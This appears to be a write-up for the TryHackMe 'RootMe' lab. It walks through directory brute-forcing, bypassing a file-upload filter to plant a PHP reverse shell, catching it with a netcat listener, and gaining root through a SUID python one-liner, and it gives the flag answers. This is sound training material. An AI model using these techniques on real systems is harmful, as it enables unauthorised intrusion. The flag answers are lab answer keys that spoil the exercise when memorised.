@@ -1,0 +1,102 @@
+Machine RootMe by @tryhackme
+	
+	###** WRITEUP **###
+	
+Task 1: Deploying the machine.
+
+Task 2: Reconnaissance.
+	
+	- scan the machine using nmap: nmap -sV ipaddress
+	- see the ports, version of apache, service running on ports.
+	
+	BRUTE FORCING USING GOBUSTER
+	- use gobuster tool to bruteforce
+		-> on port 80 we will bruteforce
+		-> gobuster dir -u http://ipaddress/ -w /usr/share/wordlists/dirb/common.txt
+		
+		-> result : Starting gobuster in directory enumeration mode
+
+		/.hta                 (Status: 403) [Size: 276]
+		/.htpasswd            (Status: 403) [Size: 276]
+		/.htaccess            (Status: 403) [Size: 276]
+		/css                  (Status: 301) [Size: 308] [--> http://10.1*.*.1*5/css/]                                                   
+		/index.php            (Status: 200) [Size: 616]
+		/js                   (Status: 301) [Size: 307] [--> http://10.1*.*.1*5/js/]                                                    
+		/panel                (Status: 301) [Size: 310] [--> http://10.1*.*.1*5/panel/]                                                 
+		/server-status        (Status: 403) [Size: 276]
+		/uploads              (Status: 301) [Size: 312] [--> http://10.1*.*.1*5/uploads/]                                               
+		Progress: 4614 / 4615 (99.98%)
+		
+		flag -> find hidden directory: /panel
+-------------------------------------------------------------------------
+Task 3: 	Reverse Shell: getting the connection back from the server past uploading a file.
+	Using: pentestmonkey ( download it from github: reverse shell file upload pentestmonkey)
+	
+	- change the ip in the .php file to your ip adress so as to get the connection back to your server.(i.e get into their server)
+	- upload the file by changing the extention i.e php to php5 or latest version.
+	- go to 10.1*.*.1*5/uploads/ if successfull means you have uploaded the file.
+	- now getting the connection back : 
+	
+	Now we need to go to ip_addr/uploads/ and also start our netcat listener in the terminal.
+/uploads/ folder
+
+How to start a netcat listener? open terminal and type nc -lvnp 1234 (the port number that was edited in your php reverse shell file).
+netcat is ready
+
+Now click on the shell in /upload/ directory and switch to netcat terminal window.
+
+We are in! :)
+
+user.txt — how to find it? use find command. Type find / -type f -name user.txt 2> /dev/null
+
+    -type f — you are telling find to look exclusively for files
+    -name user.txt — instructing the find command to search for a file with the name “user.txt”
+    2> /dev/null — so error messages do not show up as part of the search result
+
+We can see where the file is located, to open the file type cat /var/www/user.txt
+
+user.txt — Answer: THM{y0u_g0t_a_sh3ll}
+
+-------------------------------------------------------------------------------
+Task 4: Privilege Escalation
+
+Now that we have a shell, let's escalate our privileges to root.
+
+Search for files with SUID permission, which file is weird? We need to run command find / -user root -perm /4000. What it means? It is looking for a file with SUID permission that can be run as root. We need to look carefully into the output of the command to find which file can be exploited to gain root access.
+
+Search for files with SUID permission, which file is weird? Answer: /usr/bin/python
+
+How to exploit it? Go to GTFOBins https://gtfobins.github.io/ and look for Python GTFO.
+
+This is super simple now, we just need to copy this command into our user shell and watch magic happen.
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+We need to run the second part of the command here. Type whoami to get confirmation that we indeed are a root user now.
+
+To find the root.txt run this command in the terminal find / -type f -name root.txt
+
+root.txt Answer: THM{pr1v1l3g3_3sc4l4t10n}
+
+
+Hope you liked it!
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
